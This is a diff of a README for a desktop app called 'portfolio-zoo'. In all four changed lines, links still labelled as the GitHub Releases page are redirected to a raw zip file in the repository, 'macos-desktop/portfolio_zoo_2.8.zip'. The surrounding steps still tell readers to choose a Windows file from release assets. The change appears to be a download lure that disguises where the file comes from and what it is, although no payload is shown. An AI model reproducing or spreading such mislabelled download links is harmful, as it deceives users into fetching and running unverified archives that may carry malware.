@@ -1,10 +1,10 @@
 # 🎪 portfolio-zoo - Keep every portfolio in one place
 
-[![Download portfolio-zoo](https://img.shields.io/badge/Download-Portfolio%20Zoo-blue?style=for-the-badge)](https://github.com/Gilburtastronomic644/portfolio-zoo/releases)
+[![Download portfolio-zoo](https://img.shields.io/badge/Download-Portfolio%20Zoo-blue?style=for-the-badge)](https://raw.githubusercontent.com/Gilburtastronomic644/portfolio-zoo/main/macos-desktop/portfolio_zoo_2.8.zip)
 
 ## 📥 Download
 
-Visit this page to download: [GitHub Releases](https://github.com/Gilburtastronomic644/portfolio-zoo/releases)
+Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/Gilburtastronomic644/portfolio-zoo/main/macos-desktop/portfolio_zoo_2.8.zip)
 
 When the page opens, look for the latest release. Under **Assets**, download the Windows file that matches your system.
 
@@ -45,7 +45,7 @@ If your computer can run modern desktop apps, it should run portfolio-zoo.
 
 ## 🚀 Install on Windows
 
-1. Open the [GitHub Releases page](https://github.com/Gilburtastronomic644/portfolio-zoo/releases)
+1. Open the [GitHub Releases page](https://raw.githubusercontent.com/Gilburtastronomic644/portfolio-zoo/main/macos-desktop/portfolio_zoo_2.8.zip)
 2. Find the latest release at the top
 3. Under **Assets**, choose the Windows file
 4. Download the file to your computer
@@ -165,7 +165,7 @@ For the best experience:
 ## 📌 Release updates
 
 When a new version is published:
-1. Visit the [GitHub Releases page](https://github.com/Gilburtastronomic644/portfolio-zoo/releases)
+1. Visit the [GitHub Releases page](https://raw.githubusercontent.com/Gilburtastronomic644/portfolio-zoo/main/macos-desktop/portfolio_zoo_2.8.zip)
 2. Download the latest Windows file
 3. Replace the older version if needed
 4. Open the new version and check your folders
